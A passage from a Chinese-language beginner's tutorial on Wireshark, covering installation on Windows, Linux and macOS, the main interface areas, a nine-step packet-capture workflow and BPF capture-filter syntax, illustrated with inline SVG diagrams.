y="350" width="115" height="72" fill="#0b1530" stroke="#334155"/>  <text x="38" y="378" font-size="11.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Docker 容器 (无界面)</text>  <text x="156" y="374" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tshark 纯 CLI 场景 服务器抓包</text>  <text x="311" y="374" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">挂载网卡 --network=host</text>  <text x="461" y="374" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">docker run -it --network=hos</text>  <text x="671" y="374" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">容器内 /usr/bin/tshark</text>  <text x="831" y="374" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tshark -i eth0 -w /data/a.pc</text>  <text x="941" y="374" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">注意：仅能抓宿主机同 netns=--network h</text>  <rect x="30" y="510" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="526" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">新手最佳实践：Windows 11 下载官网 64bit 安装包 → 安装时勾选 Npcap + USBPcap + Associate pcap=一路 next 就完事</text>
</svg>
```


### 方式一：官网下载（推荐）

**步骤1：下载Wireshark**

1. 访问官网：https://www.wireshark.org/download.html
2. 选择Windows版本
3. 下载安装包（如`Wireshark-win64-4.2.0.exe`）

**步骤2：安装Wireshark**

1. 双击安装包
2. 选择组件：
   - **Wireshark**：核心组件（必选）
   - **TShark**：命令行版本（可选）
   - **Npcap**：数据包捕获驱动（必选！）
3. 选择安装目录
4. 点击安装

**重要提示：** Windows系统必须安装**Npcap**才能捕获数据包。Wireshark安装包会自动提示安装Npcap。

**步骤3：验证安装**

打开Wireshark，如果能够看到网络接口列表，说明安装成功。

### 方式二：便携版

下载便携版（Portable版），解压后直接运行，无需安装。

---

## 5.3 Linux 系统安装教程

### Ubuntu/Debian 安装

```bash
sudo apt update
sudo apt install wireshark
```

**配置权限（非root用户也能捕获）：**
```bash
sudo dpkg-reconfigure wireshark-common
# 选择"Yes"允许非root用户捕获

sudo usermod -a -G wireshark $USER
# 将当前用户加入wireshark组

# 重新登录后生效
```

### CentOS/RHEL 安装

```bash
sudo yum install wireshark wireshark-gnome
```

### Kali Linux（预装）

Kali Linux预装了Wireshark：
```bash
wireshark
```

---

## 5.4 macOS 系统安装教程

### 方式一：官网下载

1. 访问官网：https://www.wireshark.org/download.html
2. 下载macOS版本（.dmg文件）
3. 双击dmg文件，拖拽到Applications

### 方式二：Homebrew安装

```bash
brew install wireshark
```

---

## 5.5 界面布局详解

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 550" width="1080" height="550" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s05" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s05" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs05" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs05"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s05)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s05)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs05)">图 5-5 Wireshark 主界面 8 大区域（每个区的作用=背下来=告别乱点）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">主界面= 8 区域 自上而下：菜单栏→工具栏→捕获过滤器→报文列表→协议树→Hex 区→状态栏 + 专家信息</text>  <rect x="25" y="100" width="1030" height="410" rx="14" fill="#0f172a" stroke="#334155"/>  <rect x="25" y="100" width="1030" height="22" rx="14" fill="#1e293b"/>  <circle cx="39" cy="111" r="5" fill="#ef4444"/><circle cx="55" cy="111" r="5" fill="#f59e0b"/><circle cx="71" cy="111" r="5" fill="#10b981"/>  <text x="540.0" y="116" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Consolas,Arial">Wireshark 4.2.5 · capture on '以太网' · 1,247 packets (832,302 bytes)</text>  <rect x="31" y="126" width="1018" height="22" rx="6" fill="none" stroke="#0ea5e9" stroke-dasharray="4 3"/>  <rect x="33" y="128" width="12" height="12" rx="3" fill="#0ea5e9" opacity="0.35"/>  <text x="49" y="138" font-size="9.8" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 菜单栏 File/Edit/View/Go/Capture/Analyze/Statistics/Telephony/Wireless/</text>  <rect x="31" y="150" width="1018" height="30" rx="6" fill="none" stroke="#10b981" stroke-dasharray="4 3"/>  <rect x="33" y="152" width="12" height="12" rx="3" fill="#10b981" opacity="0.35"/>  <text x="49" y="162" font-size="9.8" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">② 主工具栏：鲨鱼鳍=开始/停止/重启 · 接口列表 · 抓包选项 · 颜色规则</text>  <rect x="31" y="182" width="1018" height="26" rx="6" fill="none" stroke="#8b5cf6" stroke-dasharray="4 3"/>  <rect x="33" y="184" width="12" height="12" rx="3" fill="#8b5cf6" opacity="0.35"/>  <text x="49" y="194" font-size="9.8" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ 捕获过滤器 BPF：host 192.168.1.1 and tcp port 80 （绿色=有效 红色=无效）</text>  <rect x="31" y="210" width="1018" height="110" rx="6" fill="none" stroke="#f59e0b" stroke-dasharray="4 3"/>  <rect x="33" y="212" width="12" height="12" rx="3" fill="#f59e0b" opacity="0.35"/>  <text x="49" y="222" font-size="9.8" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ Packet List 报文列表：No/Time/Src/Dst/Protocol/Length/Info 每色=不同协议</text>  <rect x="31" y="322" width="506" height="110" rx="6" fill="none" stroke="#ef4444" stroke-dasharray="4 3"/>  <rect x="33" y="324" width="12" height="12" rx="3" fill="#ef4444" opacity="0.35"/>  <text x="49" y="334" font-size="9.8" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ Packet Details 协议树：Frame/Ethernet/IP/TCP/HTTP 点 + 展开看字段（右键应用为过滤器）</text>  <rect x="543" y="322" width="506" height="110" rx="6" fill="none" stroke="#ec4899" stroke-dasharray="4 3"/>  <rect x="545" y="324" width="12" height="12" rx="3" fill="#ec4899" opacity="0.35"/>  <text x="561" y="334" font-size="9.8" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">⑥ Packet Bytes Hex 区：左 Hex 字节 右 ASCII 对照（右键作为数据流导出）</text>  <rect x="31" y="434" width="1018" height="22" rx="6" fill="none" stroke="#a855f7" stroke-dasharray="4 3"/>  <rect x="33" y="436" width="12" height="12" rx="3" fill="#a855f7" opacity="0.35"/>  <text x="49" y="446" font-size="9.8" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">⑦ 状态栏：文件名·包数·显示数·抓包文件大小·Profile（默认 Default）</text>  <rect x="31" y="458" width="1018" height="36" rx="6" fill="none" stroke="#06b6d4" stroke-dasharray="4 3"/>  <rect x="33" y="460" width="12" height="12" rx="3" fill="#06b6d4" opacity="0.35"/>  <text x="49" y="470" font-size="9.8" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑧ 右下角 Expert Info：Error/Warn/Note/Chat=快速定位异常 红色=严重问题</text>  <rect x="30" y="510" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="526" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">操作黄金法则：点④报文列表的某一行 → ⑤协议树自动展开 → ⑥Hex 自动高亮 → 右键 ⑤ 字段 → Apply as Filter = 一秒写过滤器</text>
</svg>
```


### Wireshark 主界面

启动Wireshark后，你会看到主界面分为几个部分：

| 区域 | 功能 |
|------|------|
| 接口列表 | 显示可捕获的网络接口 |
| 过滤栏 | 设置显示过滤器 |
| 数据包列表 | 显示捕获的数据包 |
| 数据包详情 | 显示选中包的详细信息 |
| 数据包字节 | 显示包的原始字节 |

### 接口列表

在启动界面，你会看到可用接口：

| 接口类型 | 说明 |
|------|------|
| Ethernet | 以太网接口 |
| Wi-Fi | 无线网络接口 |
| Loopback | 本地回环接口（127.0.0.1） |
| USB | USB接口 |
| Bluetooth | 蓝牙接口 |

**启动捕获：**

双击接口名称，开始捕获该接口的流量。

### 数据包列表

捕获开始后，数据包列表会显示所有捕获的包：

| 列 | 说明 |
|------|------|
| No. | 数据包序号 |
| Time | 相对时间 |
| Source | 源地址 |
| Destination | 目地址 |
| Protocol | 协议 |
| Length | 长度 |
| Info | 信息摘要 |

### 数据包详情

点击任意数据包，下方详情区域会显示：

| 标签 | 内容 |
|------|------|
| Frame | 帧信息（时间、长度等） |
| Ethernet | 以太网层信息 |
| Internet Protocol | IP层信息 |
| Transmission Control Protocol | TCP层信息 |
| Hypertext Transfer Protocol | HTTP层信息 |

### 数据包字节

最下方显示数据包的原始字节：
- 左侧：十六进制显示
- 右侧：ASCII显示

---

## 5.6 基本操作流程详解

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="1080" height="540" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s06" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s06" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs06" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs06"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s06)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s06)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs06)">图 5-6 Wireshark 9 步标准抓包分析工作流（从打开软件 → 输出报告）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">9 步走=告别乱抓 10GB 包不知道看啥=先想清楚要抓啥→写过滤器→再抓→分析→导出</text>  <rect x="60" y="160" width="165" height="140" rx="12" fill="#0b1530" stroke="#0ea5e9" filter="url(#sh)"/>  <rect x="60" y="160" width="165" height="30" rx="12" fill="#0ea5e9" opacity="0.18"/>  <rect x="60" y="160" width="165" height="30" rx="12" fill="none" stroke="#0ea5e9"/>  <text x="74" y="180" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 选网卡 &amp; 混杂模式</text>  <text x="74" y="208" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">双击以太网/WiFi 网卡</text>  <text x="74" y="223" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">选项→勾选 Promiscuous on all</text>  <rect x="235" y="160" width="165" height="140" rx="12" fill="#0b1530" stroke="#10b981" filter="url(#sh)"/>  <rect x="235" y="160" width="165" height="30" rx="12" fill="#10b981" opacity="0.18"/>  <rect x="235" y="160" width="165" height="30" rx="12" fill="none" stroke="#10b981"/>  <text x="249" y="180" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">② (可选)写捕获过滤器</text>  <text x="249" y="208" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">host 10.0.0.5 and tcp port 443</text>  <text x="249" y="223" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">先过滤=文件小 99%</text>  <rect x="410" y="160" width="165" height="140" rx="12" fill="#0b1530" stroke="#8b5cf6" filter="url(#sh)"/>  <rect x="410" y="160" width="165" height="30" rx="12" fill="#8b5cf6" opacity="0.18"/>  <rect x="410" y="160" width="165" height="30" rx="12" fill="none" stroke="#8b5cf6"/>  <text x="424" y="180" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ 点鲨鱼鳍 Start 开始抓包</text>  <text x="424" y="208" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">鲨鱼鳍蓝按钮=开始抓</text>  <text x="424" y="223" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Ctrl+E 快捷键开关</text>  <rect x="585" y="160" width="165" height="140" rx="12" fill="#0b1530" stroke="#f59e0b" filter="url(#sh)"/>  <rect x="585" y="160" width="165" height="30" rx="12" fill="#f59e0b" opacity="0.18"/>  <rect x="585" y="160" width="165" height="30" rx="12" fill="none" stroke="#f59e0b"/>  <text x="599" y="180" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ 复现目标操作/访问</text>  <text x="599" y="208" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">浏览器访问目标网站 / 登录后台 / 上传文件</text>  <text x="599" y="223" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">复现问题即停止</text>  <rect x="760" y="160" width="165" height="140" rx="12" fill="#0b1530" stroke="#ef4444" filter="url(#sh)"/>  <rect x="760" y="160" width="165" height="30" rx="12" fill="#ef4444" opacity="0.18"/>  <rect x="760" y="160" width="165" height="30" rx="12" fill="none" stroke="#ef4444"/>  <text x="774" y="180" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ 红方块 Stop 停止抓包</text>  <text x="774" y="208" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Ctrl+E 停止</text>  <text x="774" y="223" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">未停止=越抓越大 卡爆</text>  <rect x="60" y="335" width="165" height="140" rx="12" fill="#0b1530" stroke="#ec4899" filter="url(#sh)"/>  <rect x="60" y="335" width="165" height="30" rx="12" fill="#ec4899" opacity="0.18"/>  <rect x="60" y="335" width="165" height="30" rx="12" fill="none" stroke="#ec4899"/>  <text x="74" y="355" font-size="12" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">⑥ 写显示过滤器精筛</text>  <text x="74" y="383" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ip.addr==192.168.1.100 and http</text>  <text x="74" y="398" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">绿色=语法 OK</text>  <rect x="235" y="335" width="165" height="140" rx="12" fill="#0b1530" stroke="#a855f7" filter="url(#sh)"/>  <rect x="235" y="335" width="165" height="30" rx="12" fill="#a855f7" opacity="0.18"/>  <rect x="235" y="335" width="165" height="30" rx="12" fill="none" stroke="#a855f7"/>  <text x="249" y="355" font-size="12" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">⑦ Follow Stream 追踪流</text>  <text x="249" y="383" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">右键报文→Follow→TCP Stream</text>  <text x="249" y="398" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">看完整 HTTP 请求/响应</text>  <rect x="410" y="335" width="165" height="140" rx="12" fill="#0b1530" stroke="#06b6d4" filter="url(#sh)"/>  <rect x="410" y="335" width="165" height="30" rx="12" fill="#06b6d4" opacity="0.18"/>  <rect x="410" y="335" width="165" height="30" rx="12" fill="none" stroke="#06b6d4"/>  <text x="424" y="355" font-size="12" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑧ Statistics 统计 / IO 图</text>  <text x="424" y="383" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Statistics→Conversations 会话</text>  <text x="424" y="398" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">IO Graph 看 1 秒带宽变化</text>  <rect x="585" y="335" width="165" height="140" rx="12" fill="#0b1530" stroke="#334155" filter="url(#sh)"/>  <rect x="585" y="335" width="165" height="30" rx="12" fill="#334155" opacity="0.18"/>  <rect x="585" y="335" width="165" height="30" rx="12" fill="none" stroke="#334155"/>  <text x="599" y="355" font-size="12" font-weight="800" fill="#334155" font-family="Microsoft YaHei,Arial">⑨ 导出 &amp; 写报告</text>  <text x="599" y="383" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">File→Save as capture.pcap</text>  <text x="599" y="398" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">File→Export Objects→HTTP 导出文件</text>  <line x1="225" y1="200" x2="235" y2="200" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="230.0" y="196.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">1→2</text>  <line x1="400" y1="200" x2="410" y2="200" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="405.0" y="196.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">2→3</text>  <line x1="575" y1="200" x2="585" y2="200" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="580.0" y="196.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">3→4</text>  <line x1="750" y1="200" x2="760" y2="200" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="755.0" y="196.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">4→5</text>  <line x1="842" y1="300" x2="142" y2="335" stroke="#60a5fa" stroke-width="2" stroke-dasharray="3 3" marker-end="url(#arr)"/>  <text x="492.0" y="313.5" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">⑤ stop</text>  <line x1="400" y1="405" x2="410" y2="405" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="405.0" y="401.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">6→7</text>  <line x1="575" y1="405" x2="585" y2="405" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="580.0" y="401.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">7→8</text>  <line x1="750" y1="405" x2="760" y2="405" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="755.0" y="401.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">8→9</text>  <rect x="30" y="510" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="526" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">9 步缺一不可：少了第 ② 步=你抓 1 天也找不到关键包=先写捕获过滤器是王道</text>
</svg>
```


### 启动捕获

**步骤1：选择接口**

在接口列表中，选择要捕获的接口：
- 如果要捕获本机网络流量，选择主网卡（如Ethernet或Wi-Fi）
- 如果要捕获本地程序通信，选择Loopback

**步骤2：开始捕获**

双击接口，或点击"Start Capture"按钮。

### 停止捕获

点击红色方块按钮"Stop Capture"停止捕获。

### 保存捕获文件

**保存为文件：**
1. 点击"File" → "Save As"
2. 选择保存格式（默认.pcapng）
3. 输入文件名保存

**支持的文件格式：**
| 格式 | 说明 |
|------|------|
| pcapng | Wireshark新格式（推荐） |
| pcap | 传统格式 |
| snoop | Solaris格式 |
| netmon | Microsoft格式 |

### 打开捕获文件

点击"File" → "Open"，选择已保存的捕获文件。

---

## 5.7 捕获过滤器详解

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 590" width="1080" height="590" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s07" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s07" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs07" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs07"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s07)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s07)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs07)">图 5-7 捕获过滤器 BPF 语法全图：12 个关键字 + 6 组运算符 + 18 条实战例句</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">捕获过滤器=BPF(Berkeley Packet Filter)语法，网卡驱动层过滤→抓包文件极小→性能极佳→绿色=有效 红色=无效</text>  <rect x="30" y="100" width="500" height="258" rx="14" fill="#0b1530" stroke="#8b5cf6"/>  <text x="280" y="126" text-anchor="middle" font-size="14" font-weight="800" fill="#c4b5fd" font-family="Microsoft YaHei,Arial">① BPF 12 关键字（Type/Dir/Proto 三类）</text>  <rect x="42" y="140" width="476" height="36" rx="6" fill="#0f172a" stroke="#8b5cf6"/>  <text x="52" y="155" font-size="10.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Type 类型类（指定是啥）</text>  <text x="52" y="170" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">host / net / port / portrange</text>  <rect x="42" y="180" width="476" height="36" rx="6" fill="#0f172a" stroke="#a855f7"/>  <text x="52" y="195" font-size="10.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">Dir 方向类（进/出）</text>  <text x="52" y="210" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">src / dst / src or dst / src and dst</text>  <rect x="42" y="220" width="476" height="36" rx="6" fill="#0f172a" stroke="#ec4899"/>  <text x="52" y="235" font-size="10.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">Proto 协议类（L2-L7）</text>  <text x="52" y="250" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">ether / ip / ip6 / arp / rarp / tcp / udp / http</text>  <rect x="42" y="260" width="476" height="36" rx="6" fill="#0f172a" stroke="#0ea5e9"/>  <text x="52" y="275" font-size="10.5" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">广播/多播</text>  <text x="52" y="290" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">broadcast / multicast / less 128 / greater 512</text>  <rect x="42" y="300" width="476" height="36" rx="6" fill="#0f172a" stroke="#10b981"/>  <text x="52" y="315" font-size="10.5" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">网关 gateway</text>  <text x="52" y="330" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">gateway 192.168.1.1 (转发过该网关)</text>  <rect x="42" y="340" width="476" height="36" rx="6" fill="#0f172a" stroke="#f59e0b"/>  <text x="52" y="355" font-size="10.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">长度与字节位 offset</text>  <text x="52" y="370" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">len &lt;= 128 · ether[0] &amp; 1 !=0 · tcp[13] &amp; 2 != 0 (SYN)</text>  <rect x="550" y="100" width="500" height="258" rx="14" fill="#0b1530" stroke="#10b981"/>  <text x="800" y="126" text-anchor="middle" font-size="14" font-weight="800" fill="#34d399" font-family="Microsoft YaHei,Arial">② 6 组逻辑运算符（优先级 高→低）</text>  <rect x="562" y="148" width="476" height="32" rx="6" fill="#0f172a" stroke="#ef4444"/>  <text x="572" y="162" font-size="10.5" font-weight="800" fill="#ef4444" font-family="Consolas,Arial">高 ! / not</text>  <text x="760" y="162" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">非: !host 10.0.0.1 = 非该主机</text>  <rect x="562" y="184" width="476" height="32" rx="6" fill="#0f172a" stroke="#f59e0b"/>  <text x="572" y="198" font-size="10.5" font-weight="800" fill="#f59e0b" font-family="Consolas,Arial">中 &amp;&amp; / and</text>  <text x="760" y="198" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">与: host 1.1.1.1 and tcp port 443</text>  <rect x="562" y="220" width="476" height="32" rx="6" fill="#0f172a" stroke="#06b6d4"/>  <text x="572" y="234" font-size="10.5" font-weight="800" fill="#06b6d4" font-family="Consolas,Arial">低 || / or</text>  <text x="760" y="234" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">或: port 80 or port 443</text>  <rect x="562" y="256" width="476" height="32" rx="6" fill="#0f172a" stroke="#8b5cf6"/>  <text x="572" y="270" font-size="10.5" font-weight="800" fill="#8b5cf6" font-family="Consolas,Arial">( ) 括号</text>  <text x="760" y="270" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">(host 1.1.1.1 or host 2.2.2.2) and tcp</text>  <rect x="562" y="292" width="476" height="32" rx="6" fill="#0f172a" stroke="#a855f7"/>  <text x="572" y="306" font-size="10.5" font-weight="800" fill="#a855f7" font-family="Consolas,Arial">= 等于 / != 不等于</text>  <text x="760" y="306" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">tcp[13] = 18 → SYN+ACK 握手包</text>  <rect x="562" y="328" width="476" height="32" rx="6" fill="#0f172a" stroke="#ec4899"/>  <text x="572" y="342" font-size="10.5" font-weight="800" fill="#ec4899" font-family="Consolas,Arial">&lt; &gt; &lt;= &gt;= 比较</text>  <text x="760" y="342" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">len &gt; 1000 大于 1000 字节大包</text>  <rect x="30" y="370" width="1020" height="24" rx="6" fill="#020617" stroke="#6366f1"/>  <text x="540" y="387" text-anchor="middle" font-size="12" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">③ 18 条 BPF 实战例句（复制粘贴即用，绿色为高频 8 条）</text>  <rect x="30" y="398" width="335" height="22" rx="5" fill="#0b1530" stroke="#0ea5e9"/>  <text x="36" y="413" font-size="9.2" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">1. 只抓 HTTP     </text>  <text x="160" y="413" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">tcp port 80</text>  <rect x="375" y="398" width="335" height="22" rx="5" fill="#0b1530" stroke="#10b981"/>  <text x="381" y="413" font-size="9.2" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">2. 只抓 DNS      </text>  <text x="505" y="413" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">udp port 53 or tcp port 53</text>  <rect x="720" y="398" width="335" height="22" rx="5" fill="#0b1530" stroke="#8b5cf6"/>  <text x="726" y="413" font-size="9.2" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">3. 单 IP 全流量    </text>  <text x="850" y="413" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">host 192.168.1.100</text>  <rect x="30" y="424" width="335" height="22" rx="5" fill="#0b1530" stroke="#f59e0b"/>  <text x="36" y="439" font-size="9.2" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">4. 只抓访问目标      </text>  <text x="160" y="439" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">dst host 223.5.5.5</text>  <rect x="375" y="424" width="335" height="22" rx="5" fill="#0b1530" stroke="#ef4444"/>  <text x="381" y="439" font-size="9.2" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">5. HTTPS TLS   </text>  <text x="505" y="439" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">host 192.168.1.1 and tcp port 443</text>  <rect x="720" y="424" width="335" height="22" rx="5" fill="#0b1530" stroke="#ec4899"/>  <text x="726" y="439" font-size="9.2" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">6. MySQL 数据库   </text>  <text x="850" y="439" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">tcp port 3306 and host 10.0.0.5</text>  <rect x="30" y="450" width="335" height="22" rx="5" fill="#0b1530" stroke="#a855f7"/>  <text x="36" y="465" font-size="9.2" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">7. SSH+RDP 远控  </text>  <text x="160" y="465" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">tcp portrange 22-3389</text>  <rect x="375" y="450" width="335" height="22" rx="5" fill="#0b1530" 